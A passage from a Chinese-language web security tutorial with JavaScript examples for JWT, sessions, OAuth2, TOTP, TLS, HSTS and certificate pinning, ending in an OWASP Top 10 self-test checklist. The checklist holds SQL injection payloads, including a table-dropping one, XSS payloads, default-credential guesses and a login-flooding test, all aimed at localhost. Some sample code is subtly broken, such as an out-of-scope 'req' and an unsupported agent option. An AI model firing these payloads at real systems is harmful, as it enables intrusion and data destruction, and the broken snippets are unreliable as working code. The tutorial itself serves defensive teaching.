      format: 'pem'
    },
    privateKeyEncoding: {
      type: 'pkcs8',
      format: 'pem'
    }
  });

  return { publicKey, privateKey };
}

// JWT配置
const JWT_CONFIG = {
  // 使用RS256算法
  algorithm: 'RS256',

  // 访问令牌过期时间：15分钟
  accessTokenExpiresIn: '15m',

  // 刷新令牌过期时间：7天
  refreshTokenExpiresIn: '7d',

  // 发行者声明
  issuer: 'https://api.example.com',

  // 受众声明
  audience: 'https://example.com'
};

class JWTSecurity {
  // 私钥（应从安全存储获取，如环境变量或密钥管理服务）
  static privateKey = process.env.JWT_PRIVATE_KEY;

  // 公钥（用于验证）
  static publicKey = process.env.JWT_PUBLIC_KEY;

  /**
   * 生成访问令牌
   */
  static signAccessToken(payload) {
    // 添加安全相关的声明
    const safePayload = {
      ...payload,
      // 令牌类型声明
      type: 'access',
      // 发行时间
      iat: Math.floor(Date.now() / 1000),
      // 发行者
      iss: JWT_CONFIG.issuer,
      // 受众
      aud: JWT_CONFIG.audience
    };

    return jwt.sign(safePayload, this.privateKey, {
      algorithm: JWT_CONFIG.algorithm,
      expiresIn: JWT_CONFIG.accessTokenExpiresIn
    });
  }

  /**
   * 生成刷新令牌
   * 刷新令牌应该有更长的过期时间和更严格的保护
   */
  static signRefreshToken(payload) {
    // 使用更长的过期时间
    return jwt.sign(
      {
        ...payload,
        type: 'refresh',
        iat: Math.floor(Date.now() / 1000),
        jti: crypto.randomUUID() // JWT ID，用于撤销
      },
      this.privateKey,
      {
        algorithm: JWT_CONFIG.algorithm,
        expiresIn: JWT_CONFIG.refreshTokenExpiresIn
      }
    );
  }

  /**
   * 验证并解码令牌
   */
  static verify(token) {
    try {
      const decoded = jwt.verify(token, this.publicKey, {
        algorithms: [JWT_CONFIG.algorithm],
        issuer: JWT_CONFIG.issuer,
        audience: JWT_CONFIG.audience
      });

      // 验证令牌类型
      if (decoded.type !== 'access') {
        throw new Error('无效的令牌类型');
      }

      return { valid: true, payload: decoded };
    } catch (error) {
      return {
        valid: false,
        error: error.message,
        code: this.getErrorCode(error)
      };
    }
  }

  /**
   * 刷新访问令牌
   * 使用刷新令牌获取新的访问令牌
   */
  static async refreshAccessToken(refreshToken) {
    try {
      // 验证刷新令牌
      const decoded = jwt.verify(refreshToken, this.publicKey, {
        algorithms: [JWT_CONFIG.algorithm]
      });

      if (decoded.type !== 'refresh') {
        throw new Error('无效的令牌类型');
      }

      // 检查令牌是否已被撤销（在数据库中查询jti）
      const isRevoked = await TokenRevocation.isRevoked(decoded.jti);
      if (isRevoked) {
        throw new Error('令牌已被撤销');
      }

      // 生成新的访问令牌
      const newAccessToken = this.signAccessToken({
        userId: decoded.userId,
        role: decoded.role
      });

      return { accessToken: newAccessToken };
    } catch (error) {
      throw new Error('无法刷新令牌');
    }
  }

  /**
   * 获取错误代码
   */
  static getErrorCode(error) {
    switch (error.name) {
      case 'TokenExpiredError':
        return 'TOKEN_EXPIRED';
      case 'JsonWebTokenError':
        return 'TOKEN_INVALID';
      case 'NotBeforeError':
        return 'TOKEN_NOT_ACTIVE';
      default:
        return 'TOKEN_ERROR';
    }
  }

  /**
   * 撤销令牌
   * 将令牌的jti加入黑名单
   */
  static async revoke(token) {
    const decoded = jwt.decode(token);
    if (decoded && decoded.jti) {
      // 计算令牌的剩余过期时间
      const expiresAt = decoded.exp;
      const now = Math.floor(Date.now() / 1000);
      const ttl = expiresAt - now;

      if (ttl > 0) {
        // 将jti加入黑名单，设置与令牌剩余有效期相同的TTL
        await TokenRevocation.add(decoded.jti, ttl);
      }
    }
  }
}

// 令牌撤销存储（使用Redis实现）
class TokenRevocation {
  static redis = require('./redis');

  /**
   * 将jti加入黑名单
   */
  static async add(jti, ttlSeconds) {
    await this.redis.setex(`revoked:${jti}`, ttlSeconds, '1');
  }

  /**
   * 检查jti是否在黑名单中
   */
  static async isRevoked(jti) {
    const result = await this.redis.get(`revoked:${jti}`);
    return result === '1';
  }
}
```

### 3.3 Session安全

Session安全是Web应用认证的重要组成部分。与JWT的无状态特性不同，Session需要在服务端存储会话数据。虽然JWT在分布式系统中更易扩展，但Session在安全性控制方面更为灵活。

```javascript
// Session安全实现
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis').RedisStore;
const crypto = require('crypto');

const app = express();

// Redis会话存储配置
const redisClient = require('./redis');

const sessionStore = new RedisStore({
  client: redisClient,
  // 会话前缀，便于识别和管理
  prefix: 'sess:',
  // 禁用触摸（touch）操作，减少不必要的更新
  disableTouch: true
});

// 安全会话配置
app.use(session({
  store: sessionStore,

  // 会话ID的生成方式
  genid: () => {
    // 使用加密安全的随机数生成器
    return crypto.randomBytes(32).toString('hex');
  },

  // 会话名称
  name: '__Host-session', // 使用__Host-前缀需要配合HTTPS

  // 禁用服务端签名（我们自己实现额外的安全措施）
  secret: process.env.SESSION_SECRET,

  // 是否在每次请求时重置会话
  resave: false,

  // 是否在创建会话时保存未修改的值
  saveUninitialized: false,

  // Cookie配置
  cookie: {
    // 安全Cookie必须设置secure为true
    secure: process.env.NODE_ENV === 'production',

    // HTTPOnly防止JavaScript读取
    httpOnly: true,

    // SameSite配置
    // 'strict': 完全禁止跨站请求携带cookie
    // 'lax': 默认选项，允许导航请求携带cookie
    // 'none': 允许跨站请求，必须配合secure使用
    sameSite: 'strict',

    // Cookie有效期
    maxAge: 60 * 60 * 1000, // 1小时

    // 限制Cookie只能通过HTTPS传输（生产环境）
    secure: true,

    // Domain限制（如果需要子域共享则设置）
    // domain: '.example.com'
  },

  // 滚动过期：每次访问重置会话过期时间
  rolling: true
}));

// 会话固定攻击防护
// 在用户登录成功后更换会话ID
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const user = await authenticateUser(username, password);

  if (user) {
    // 登录成功后，重新生成会话ID
    // 这是防止会话固定攻击的关键步骤
    return req.session.regenerate((err) => {
      if (err) {
        return res.status(500).json({ error: '登录失败' });
      }

      // 设置新的会话数据
      req.session.userId = user.id;
      req.session.role = user.role;
      req.session.loginTime = Date.now();

      // 保存并发送响应
      req.session.save((saveErr) => {
        if (saveErr) {
          return res.status(500).json({ error: '登录失败' });
        }
        res.json({ success: true, message: '登录成功' });
      });
    });
  }

  res.status(401).json({ error: '用户名或密码错误' });
});

// 会话劫持检测
// 检测会话是否从不同的IP或User-Agent访问
app.use((req, res, next) => {
  if (req.session.userId) {
    // 获取当前请求的特征
    const currentIp = req.ip;
    const currentUserAgent = req.headers['user-agent'];

    // 检查是否与首次登录时一致
    if (req.session.ip !== currentIp || req.session.userAgent !== currentUserAgent) {
      // 特征发生变化，可能是会话劫持
      // 可以选择记录日志、发送告警或强制登出
      console.warn('会话特征变化检测:', {
        sessionId: req.sessionID,
        userId: req.session.userId,
        originalIp: req.session.ip,
        currentIp,
        originalAgent: req.session.userAgent,
        currentAgent: currentUserAgent
      });

      // 可选：强制登出
      // req.session.destroy();
      // return res.status(401).json({ error: '会话异常，请重新登录' });
    }

    // 更新会话特征（如果首次设置）
    if (!req.session.ip) {
      req.session.ip = currentIp;
      req.session.userAgent = currentUserAgent;
    }
  }
  next();
});

// 登出时销毁会话
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: '登出失败' });
    }

    // 清除Cookie
    res.clearCookie('__Host-session');
    res.json({ success: true });
  });
});
```

### 3.4 OAuth2.0授权

OAuth2.0是一种授权框架，允许第三方应用获取对用户账户的有限访问权限，而无需用户提供用户名和密码。OAuth2.0广泛应用于"使用XX登录"功能。

```javascript
// OAuth2.0授权流程实现
const express = require('express');
const crypto = require('crypto');
const axios = require('axios');
const querystring = require('querystring');

const app = express();

// OAuth2.0配置
const OAUTH_CONFIG = {
  // GitHub作为示例提供商
  provider: 'github',
  clientId: process.env.GITHUB_CLIENT_ID,
  clientSecret: process.env.GITHUB_CLIENT_SECRET,

  // 授权回调URL
  redirectUri: 'https://example.com/auth/callback',

  // OAuth2.0端点
  authorizationUrl: 'https://github.com/login/oauth/authorize',
  tokenUrl: 'https://github.com/login/oauth/access_token',
  userInfoUrl: 'https://api.github.com/user',

  // 请求的权限范围
  scopes: ['read:user', 'user:email']
};

class OAuth2Provider {
  /**
   * 生成授权URL
   * 用户将被重定向到这个URL进行授权
   */
  static generateAuthorizationUrl(state) {
    // state参数用于防止CSRF攻击
    // 应该是一个随机字符串，存储在会话中用于验证

    const params = new URLSearchParams({
      client_id: OAUTH_CONFIG.clientId,
      redirect_uri: OAUTH_CONFIG.redirectUri,
      scope: OAUTH_CONFIG.scopes.join(' '),
      state: state,
      // 授权页面是否显示确认窗口
      // 使用auto授权将直接跳转
      allow_signup: 'true'
    });

    return `${OAUTH_CONFIG.authorizationUrl}?${params.toString()}`;
  }

  /**
   * 交换访问令牌
   * 使用授权码交换访问令牌
   */
  static async exchangeCodeForToken(code, state) {
    // 验证state参数防止CSRF
    // 从会话中获取存储的state进行比较
    const storedState = req.session.oauthState;
    if (state !== storedState) {
      throw new Error('OAuth状态验证失败，可能遭受CSRF攻击');
    }

    // 使用授权码请求访问令牌
    const response = await axios.post(
      OAUTH_CONFIG.tokenUrl,
      {
        client_id: OAUTH_CONFIG.clientId,
        client_secret: OAUTH_CONFIG.clientSecret,
        code: code,
        redirect_uri: OAUTH_CONFIG.redirectUri,
        grant_type: 'authorization_code'
      },
      {
        headers: {
          Accept: 'application/json'
        }
      }
    );

    const {
      access_token,
      token_type,
      refresh_token,
      expires_in,
      scope
    } = response.data;

    return {
      accessToken: access_token,
      tokenType: token_type,
      refreshToken: refresh_token,
      expiresIn: expires_in,
      scope: scope
    };
  }

  /**
   * 获取用户信息
   */
  static async getUserInfo(accessToken) {
    const response = await axios.get(OAUTH_CONFIG.userInfoUrl, {
      headers: {
        Authorization: `Bearer ${accessToken}`,
        Accept: 'application/json'
      }
    });

    return {
      provider: OAUTH_CONFIG.provider,
      providerId: response.data.id.toString(),
      email: response.data.email,
      name: response.data.name,
      avatarUrl: response.data.avatar_url,
      username: response.data.login
    };
  }

  /**
   * 处理OAuth登录流程
   */
  static async handleOAuthCallback(code, state) {
    // 1. 验证state
    // 2. 交换令牌
    const tokens = await this.exchangeCodeForToken(code, state);

    // 3. 获取用户信息
    const userInfo = await this.getUserInfo(tokens.accessToken);

    // 4. 查找或创建用户
    const user = await this.findOrCreateUser(userInfo);

    // 5. 生成应用会话
    const sessionToken = generateSessionToken(user);

    return { user, sessionToken };
  }
}

// OAuth授权路由
app.get('/auth/login', (req, res) => {
  // 生成随机的state值
  const state = crypto.randomBytes(16).toString('hex');

  // 存储state到会话，用于验证回调
  req.session.oauthState = state;

  // 生成授权URL并重定向
  const authUrl = OAuth2Provider.generateAuthorizationUrl(state);
  res.redirect(authUrl);
});

// OAuth回调路由
app.get('/auth/callback', async (req, res) => {
  const { code, state, error } = req.query;

  // 处理用户拒绝授权的情况
  if (error) {
    return res.redirect('/login?error=' + encodeURIComponent(error));
  }

  try {
    // 处理OAuth流程
    const { user, sessionToken } = await OAuth2Provider.handleOAuthCallback(code, state);

    // 设置会话
    req.session.userId = user.id;

    // 重定向到原始请求页面或首页
    res.redirect('/dashboard');
  } catch (error) {
    console.error('OAuth错误:', error);
    res.redirect('/login?error=oauth_failed');
  }
});
```

### 3.5 多因素认证MFA

多因素认证（MFA）通过要求用户提供多种形式的身份证明来增强账户安全。通常涉及三种因素：你知道的（密码）、你拥有的（手机、安全密钥）、你是的（指纹、面部识别）。

```javascript
// MFA实现：基于时间的一次性密码（TOTP）
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

class MFAProvider {
  /**
   * 生成MFA密钥和二维码
   * 用户扫描二维码后将得到一个认证器应用
   */
  static async generateSecret(user) {
    // 生成TOTP密钥
    const secret = speakeasy.generateSecret({
      name: `ExampleApp:${user.email}`, // 应用名称和用户标识
      length: 20,
      algorithm: 'sha512', // 更安全的算法
      digits: 6, // 6位数字
      step: 30 // 30秒过期
    });

    // 生成OTPAAuth URI（用于二维码）
    const otpauthUri = secret.otpauth_url;

    // 生成二维码
    const qrCodeDataUrl = await QRCode.toDataURL(otpauthUri, {
      errorCorrectionLevel: 'M',
      type: 'image/png',
      margin: 2,
      width: 200
    });

    return {
      secret: secret.base32, // 用户需要备份的密钥
      qrCode: qrCodeDataUrl,
      otpauthUri: otpauthUri
    };
  }

  /**
   * 验证用户输入的验证码
   */
  static verifyToken(secret, token) {
    // 使用常量时间比较防止时序攻击
    const isValid = speakeasy.totp.verify({
      secret: secret,
      token: token,
      encoding: 'base32',
      algorithm: 'sha512',
      digits: 6,
      step: 30,
      window: 1 // 允许前后各1个时间步长的误差
    });

    return isValid;
  }

  /**
   * 验证TOTP并启用MFA
   */
  static async enableMFA(user, token) {
    // 验证用户提供的验证码
    const isValid = this.verifyToken(user.mfaSecret, token);

    if (!isValid) {
      throw new Error('无效的验证码');
    }

    // 保存已验证的密钥，启用MFA
    user.mfaEnabled = true;
    user.mfaSecret = user.mfaSecret; // 密钥已在数据库中
    user.mfaEnabledAt = new Date();
    await user.save();

    return { success: true };
  }

  /**
   * 登录时验证MFA
   */
  static async verifyMFA(user, token) {
    // 检查用户是否启用了MFA
    if (!user.mfaEnabled) {
      return { requiresMFA: false };
    }

    // 检查是否在信任设备列表中
    const trustedDevice = await TrustedDevice.findOne({
      where: {
        userId: user.id,
        fingerprint: req.headers['x-device-fingerprint'],
        revoked: false
      }
    });

    if (trustedDevice && trustedDevice.expiresAt > new Date()) {
      // 在信任设备上，跳过MFA验证
      return { requiresMFA: false, trusted: true };
    }

    // 验证MFA令牌
    const isValid = this.verifyToken(user.mfaSecret, token);

    if (!isValid) {
      throw new Error('无效的验证码');
    }

    return { requiresMFA: true, verified: true };
  }
}

// MFA保护登录流程
app.post('/login', async (req, res) => {
  const { username, password, mfaToken, deviceFingerprint } = req.body;

  // 验证用户名密码
  const user = await authenticateUser(username, password);
  if (!user) {
    return res.status(401).json({ error: '认证失败' });
  }

  // 检查是否需要MFA
  if (user.mfaEnabled) {
    // 如果没有提供MFA令牌，要求输入
    if (!mfaToken) {
      return res.status(403).json({
        error: '需要多因素认证',
        mfaRequired: true
      });
    }

    // 验证MFA令牌
    const mfaResult = await MFAProvider.verifyMFA(user, mfaToken);
    if (!mfaResult.verified) {
      return res.status(401).json({ error: 'MFA验证失败' });
    }
  }

  // 登录成功
  res.json({ success: true });
});
```

---

## 第四部分：HTTPS与TLS

HTTPS是Web安全的基础，它在HTTP和TCP之间添加了一层TLS加密层，保护数据在传输过程中不被窃听或篡改。正确配置HTTPS对于保护用户数据至关重要。

### 4.1 HTTPS加密原理

HTTPS的核心是TLS（Transport Layer Security）协议，它提供了三个关键的安全保护：加密（Encryption）确保数据无法被第三方读取；完整性（Integrity）确保数据在传输过程中不被篡改；认证（Authentication）确保通信的对方是真实的。

TLS使用混合加密方案，结合了对称加密和非对称加密的优点。非对称加密用于安全地交换对称密钥，后续数据传输使用对称加密因为速度更快。

```javascript
// HTTPS/TLS配置示例（Node.js）
const https = require('https');
const fs = require('fs');
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');

const app = express();

// 强制使用HTTPS中间件（如果在反向代理层处理则不需要）
// 确保所有HTTP请求被重定向到HTTPS
app.use((req, res, next) => {
  // 检查是否为生产环境
  if (process.env.NODE_ENV === 'production') {
    // 检查是否通过代理（如负载均衡器）访问
    // 代理通常会设置X-Forwarded-Proto头
    const forwardedProto = req.get('X-Forwarded-Proto');

    if (req.protocol === 'http' || forwardedProto === 'http') {
      // 将HTTP请求重定向到HTTPS
      const secureUrl = `https://${req.hostname}${req.url}`;
      return res.redirect(301, secureUrl);
    }
  }
  next();
});

// 安全HTTP头配置
app.use(helmet());

// CORS配置
app.use(cors({
  origin: 'https://example.com',
  credentials: true,
  maxAge: 86400 // 预检请求缓存24小时
}));

// TLS/SSL证书配置
const tlsOptions = {
  // 服务器证书
  cert: fs.readFileSync('/path/to/certificate.pem'),

  // 服务器私钥
  key: fs.readFileSync('/path/to/private-key.pem'),

  // CA证书链（如果证书不是由浏览器信任的CA签发）
  ca: fs.readFileSync('/path/to/ca-chain.pem'),

  // 最低TLS版本（1.2或更高）
  minVersion: 'TLSv1.2',

  // 密码套件配置
  // 使用现代的、安全的密码套件
  // 禁用不安全的套件
  ciphers: [
    // TLS 1.3密码套件
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_GCM_SHA256',
    // TLS 1.2密码套件（保留一些向后兼容性）
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384'
  ].join(':'),

  // 完全前向保密（Perfect Forward Secrecy）
  // 每次会话使用不同的密钥，即使长期密钥泄露也不会影响过去的会话
  honorCipherOrder: true,

  // 客户端证书认证（可选，用于mTLS）
  // requestCert: true,
  // rejectUnauthorized: false,
  // ca: fs.readFileSync('/path/to/client-ca.pem')
};

// 创建HTTPS服务器
const server = https.createServer(tlsOptions, app);

// 安全头部配置
app.use((req, res, next) => {
  // 禁用服务器版本信息泄露
  res.removeHeader('X-Powered-By');
  res.removeHeader('Server');

  // 设置安全相关的响应头
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');

  // 内容类型嗅探保护
  // 强制浏览器按照声明的Content-Type而不是嗅探的类型来解析内容
  res.setHeader('X-Content-Type-Options', 'nosniff');

  next();
});
```

### 4.2 HSTS强制的HTTPS

HSTS（HTTP Strict Transport Security）是一种网络安全策略机制，它指示浏览器只能通过HTTPS连接访问网站，从而防止协议降级攻击和Cookie劫持。

```javascript
// HSTS配置
app.use((req, res, next) => {
  // Strict-Transport-Security头
  // max-age: 浏览器应该记住只使用HTTPS访问本站的时间（秒）
  // includeSubDomains: 是否对子域名也应用HSTS
  // preload: 是否支持HSTS预加载列表
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );

  // 或者更严格的配置
  // max-age设置为2年（63072000秒）
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=63072000; includeSubDomains; preload'
  );

  next();
});

// 注意事项：
// 1. 启用HSTS前确保所有HTTP页面都可以通过HTTPS访问
// 2. includeSubDomains会影响所有子域名
// 3. preload一旦启用，很难撤销，需要谨慎
```

### 4.3 证书申请与配置

SSL/TLS证书有三种类型：DV（Domain Validation，域名验证）、OV（Organization Validation，组织验证）和EV（Extended Validation，扩展验证）。从安全角度看，EV证书提供最高级别的验证，但DV证书对于大多数Web应用已经足够。

```javascript
// 证书管理模块
const fs = require('fs');
const path = require('path');
const https = require('https');
const crypto = require('crypto');

// 证书存储路径
const CERTS_DIR = '/etc/letsencrypt/live/example.com';

class CertificateManager {
  /**
   * 加载证书文件
   */
  static loadCertificates() {
    return {
      key: fs.readFileSync(path.join(CERTS_DIR, 'privkey.pem')),
      cert: fs.readFileSync(path.join(CERTS_DIR, 'cert.pem')),
      ca: fs.readFileSync(path.join(CERTS_DIR, 'chain.pem'))
    };
  }

  /**
   * 检查证书剩余有效期
   */
  static getCertificateExpiry(certPath) {
    const certFile = fs.readFileSync(certPath);
    const cert = new crypto.X509Certificate(certFile);
    const expiresAt = cert.validTo;
    const notBefore = cert.validFrom;

    return {
      expiresAt: new Date(expiresAt),
      notBefore: new Date(notBefore),
      isExpired: new Date() > new Date(expiresAt),
      daysUntilExpiry: Math.ceil(
        (new Date(expiresAt) - new Date()) / (1000 * 60 * 60 * 24)
      )
    };
  }

  /**
   * 检查证书是否即将过期（小于30天）
   */
  static isExpiringSoon(certPath, daysThreshold = 30) {
    const expiry = this.getCertificateExpiry(certPath);
    return expiry.daysUntilExpiry < daysThreshold;
  }

  /**
   * 自动续期检查（应配合cron或定时任务）
   */
  static async checkAndRenew() {
    const certPath = path.join(CERTS_DIR, 'cert.pem');

    if (this.isExpiringSoon(certPath, 30)) {
      console.log('证书即将过期，开始续期...');

      try {
        // 使用certbot或其他ACME客户端续期
        // const { execSync } = require('child_process');
        // execSync('certbot renew --quiet');

        console.log('证书续期完成');
        return true;
      } catch (error) {
        console.error('证书续期失败:', error);
        return false;
      }
    }

    return false;
  }
}

// HTTPS服务器启动配置
async function startSecureServer(app) {
  const certs = CertificateManager.loadCertificates();

  // 检查证书状态
  const certInfo = CertificateManager.getCertificateExpiry(
    path.join(CERTS_DIR, 'cert.pem')
  );

  console.log(`证书信息: 有效期至 ${certInfo.expiresAt}`);
  console.log(`距离过期还有 ${certInfo.daysUntilExpiry} 天`);

  if (certInfo.isExpired) {
    console.error('证书已过期！请立即续期！');
    process.exit(1);
  }

  if (certInfo.daysUntilExpiry < 30) {
    console.warn('证书即将在30天内过期，请及时续期！');
  }

  const server = https.createServer({
    ...certs,
    minVersion: 'TLSv1.2',
    ciphers: [
      'TLS_AES_256_GCM_SHA384',
      'TLS_CHACHA20_POLY1305_SHA256',
      'TLS_AES_128_GCM_SHA256',
      'ECDHE-RSA-AES128-GCM-SHA256',
      'ECDHE-RSA-AES256-GCM-SHA384'
    ].join(':'),
    honorCipherOrder: true
  }, app);

  return server;
}
```

### 4.4 中间人攻击防御

中间人攻击（MITM）是指攻击者秘密拦截并可能修改双方通信的攻击方式。正确配置TLS和证书固定是防御MITM攻击的有效方法。

```javascript
// 中间人攻击防御：证书固定

/**
 * 证书固定实现
 * 将受信任的证书信息硬编码到客户端，防止伪装成合法服务器的MITM攻击
 */

const crypto = require('crypto');

// 信任的证书公钥哈希列表
// 这是你要连接的服务器的证书公钥的SHA-256哈希
// 可以是主证书或中间证书的哈希
const TRUSTED_CERT_PINS = [
  // 主证书公钥哈希
  'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
  // 备份证书公钥哈希（用于证书更换）
  'sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB='
];

class CertificatePinner {
  /**
   * 验证服务器证书
   * @param {string} cert - 服务器证书（PEM格式）
   * @returns {boolean} 证书是否可信
   */
  static verify(cert) {
    // 提取证书公钥
    const x509 = new crypto.X509Certificate(cert);
    const publicKey = x509.publicKey;

    // 计算公钥的SHA-256哈希
    const keyHash = crypto
      .createHash('sha256')
      .update(publicKey)
      .digest('base64');

    // 预计算的哈希格式
    const pinHash = 'sha256/' + keyHash;

    // 检查是否在信任列表中
    if (TRUSTED_CERT_PINS.includes(pinHash)) {
      return true;
    }

    // 额外检查：验证证书链
    return this.verifyCertificateChain(cert);
  }

  /**
   * 验证证书链
   */
  static verifyCertificateChain(cert) {
    // 这里是简化的实现
    // 生产环境应该使用完整的证书链验证
    const x509 = new crypto.X509Certificate(cert);

    // 检查证书有效期
    const now = new Date();
    if (now < new Date(x509.validFrom) || now > new Date(x509.validTo)) {
      console.error('证书已过期或未生效');
      return false;
    }

    // 检查证书是否被吊销（使用OCSP）
    // 这需要查询证书颁发机构的OCSP服务器
    // ...

    return true;
  }
}

// 在Node.js的https请求中使用证书固定
const https = require('https');

const agent = new https.Agent({
  // 自定义证书验证
  verifyServerCertificate: (cert, trustedCerts) => {
    // 验证服务器证书
    return CertificatePinner.verify(cert);
  }
});

// 创建自定义的https.Agent用于固定证书请求
class PinnedHttpsAgent extends https.Agent {
  createConnection(options, callback) {
    const socket = https.Agent.prototype.createConnection.call(this, options, callback);

    // 监听证书事件以进行固定验证
    socket.on('secure', () => {
      const cert = socket.getPeerCertificate();
      if (cert && !CertificatePinner.verify(cert)) {
        // 证书不匹配，可能存在MITM攻击
        console.error('证书固定验证失败！可能存在中间人攻击！');
        socket.destroy();
      }
    });

    return socket;
  }
}

// 使用示例
const pinnedAgent = new PinnedHttpsAgent({
  rejectUnauthorized: true // 仍然启用证书验证
});

// 发起请求
const request = https.request({
  hostname: 'api.example.com',
  port: 443,
  path: '/data',
  method: 'GET',
  agent: pinnedAgent
}, (res) => {
  // 处理响应
});
```

---

## 第五部分：渗透测试基础

渗透测试是通过模拟黑客攻击来评估系统安全性的方法。了解渗透测试的基础知识有助于开发者更好地理解安全威胁并构建更安全的系统。

### 5.1 OWASP Top 10

OWASP（Open Web Application Security Project）Top 10是一份最常见和最危险的Web应用安全风险列表。了解这些风险是构建安全应用的基础。

```javascript
// OWASP Top 10 安全检查清单实现

/**
 * OWASP Top 10 (2021) 安全检查模块
 */

const OWASPChecklist = {
  // A01: 访问控制失效
  BrokenAccessControl: {
    name: '访问控制失效',

    checks: [
      {
        id: 'BAC-001',
        title: '垂直权限提升',
        description: '检查用户是否能访问超越其权限级别的功能',
        severity: 'CRITICAL',
        test: async (app) => {
          // 测试普通用户是否能访问管理员功能
          const adminEndpoints = [
            '/admin/users',
            '/admin/settings',
            '/api/admin/*'
          ];

          for (const endpoint of adminEndpoints) {
            const response = await fetch(`http://localhost${endpoint}`, {
              headers: { 'Authorization': 'Bearer user-token' }
            });

            if (response.ok) {
              return {
                vulnerable: true,
                endpoint,
                message: '普通用户能够访问管理员端点'
              };
            }
          }

          return { vulnerable: false };
        }
      },
      {
        id: 'BAC-002',
        title: '水平权限提升',
        description: '检查用户是否能访问同级别其他用户的数据',
        severity: 'HIGH',
        test: async (app) => {
          // 测试用户A是否能访问用户B的资源
          // 通过修改ID参数尝试访问其他用户的数据
          const userAResource = await fetch('/api/documents/123', {
            headers: { 'Authorization': 'Bearer user-A-token' }
          });

          // 尝试使用用户B的token访问同一资源
          const crossedAccess = await fetch('/api/documents/123', {
            headers: { 'Authorization': 'Bearer user-B-token' }
          });

          // 检查返回的数据是否属于正确的用户
          // ...

          return { vulnerable: false };
        }
      }
    ]
  },

  // A02: 加密失败
  CryptographicFailures: {
    name: '加密失败',

    checks: [
      {
        id: 'CF-001',
        title: '敏感数据传输',
        description: '检查敏感数据是否通过HTTP明文传输',
        severity: 'HIGH',
        test: async (app) => {
          // 检查是否有HTTP端点传输敏感数据
          const response = await fetch('http://localhost/api/user/profile');

          // 检查响应中是否包含敏感字段
          const body = await response.text();
          const containsSensitive = /password|credit_card|ssn/i.test(body);

          return {
            vulnerable: containsSensitive,
            message: containsSensitive ? '敏感数据通过HTTP传输' : '未发现问题'
          };
        }
      }
    ]
  },

  // A03: 注入
  Injection: {
    name: '注入',

    checks: [
      {
        id: 'INJ-001',
        title: 'SQL注入',
        description: '检测SQL注入漏洞',
        severity: 'CRITICAL',
        test: async (app) => {
          // 测试常见SQL注入payload
          const payloads = [
            "' OR '1'='1",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users--",
            "1' AND '1'='1"
          ];

          for (const payload of payloads) {
            const response = await fetch(
              `http://localhost/api/users?id=${encodeURIComponent(payload)}`
            );

            const body = await response.text();

            // 检测SQL错误信息泄露
            if (/sql|syntax|error|warning/i.test(body) &&
                /select|from|where|union/i.test(body)) {
              return {
                vulnerable: true,
                payload,
                message: '发现SQL注入漏洞，错误信息泄露'
              };
            }
          }

          return { vulnerable: false };
        }
      },
      {
        id: 'INJ-002',
        title: 'XSS跨站脚本',
        description: '检测反射型XSS漏洞',
        severity: 'MEDIUM',
        test: async (app) => {
          const xssPayloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            "javascript:alert('XSS')"
          ];

          for (const payload of xssPayloads) {
            const response = await fetch(
              `http://localhost/api/search?q=${encodeURIComponent(payload)}`
            );

            // 检查payload是否未经转义直接返回
            if (response.text().includes(payload)) {
              return {
                vulnerable: true,
                payload,
                message: '发现反射型XSS漏洞'
              };
            }
          }

          return { vulnerable: false };
        }
      }
    ]
  },

  // A04: 不安全的设计
  InsecureDesign: {
    name: '不安全的设计',

    checks: [
      {
        id: 'ID-001',
        title: '缺少速率限制',
        description: '检查API是否有速率限制',
        severity: 'MEDIUM',
        test: async (app) => {
          // 发送大量请求
          const requests = [];
          for (let i = 0; i < 100; i++) {
            requests.push(fetch('http://localhost/api/login', {
              method: 'POST',
              body: JSON.stringify({ username: 'test', password: 'test' })
            }));
          }

          const responses = await Promise.all(requests);
          const successCount = responses.filter(r => r.ok).length;

          // 如果所有请求都成功，说明没有速率限制
          return {
            vulnerable: successCount === 100,
            message: successCount === 100
              ? '登录接口缺少速率限制，可能遭受暴力破解'
              : '已检测到速率限制保护'
          };
        }
      }
    ]
  },

  // A05: 安全配置错误
  SecurityMisconfiguration: {
    name: '安全配置错误',

    checks: [
      {
        id: 'SMC-001',
        title: '默认配置',
        description: '检查是否使用默认配置',
        severity: 'MEDIUM',
        test: async (app) => {
          // 检查常见的默认配置
          const defaultCredentials = [
            ['admin', 'admin'],
            ['admin', 'password'],
            ['root', 'root']
          ];

          for (const [user, pass] of defaultCredentials) {
            const response = await fetch('http://localhost/api/login', {
              method: 'POST',
              body: JSON.stringify({ username: user, password: pass })
            });

            if (response.ok) {
              return {
                vulnerable: true,
                message: `默认凭据有效: ${user}/${pass}`
              };
            }
          }

          return { vulnerable: false };
        }
      },
      {
        id: 'SMC-002',
        title: '详细错误信息',
        description: '检查是否泄露详细错误信息',
        severity: 'LOW',
        test: async (app) => {
          const response = await fetch('http://localhost/api/error-trigger');

          // 检查是否返回堆栈跟踪或敏感信息
          const text = await response.text();

          const sensitivePatterns = [
            /stack\s*trace/i,
            /at\s+\w+\.\w+\(/i,
            /Exception in thread/i,
            /\.java:\d+/i,
            /\.cs:\d+/i
          ];

          for (const pattern of sensitivePatterns) {
            if (pattern.test(text)) {
              return {
                vulnerable: true,
                message: '详细错误信息泄露'
              };
            }
          }

          return { vulnerable: false };
        }
      }
    ]
  },

  // A06: 易受攻击和过时的组件
  VulnerableAndOutdatedComponents: {
    name: '易受攻击和过时的组件',

    checks: [
      {
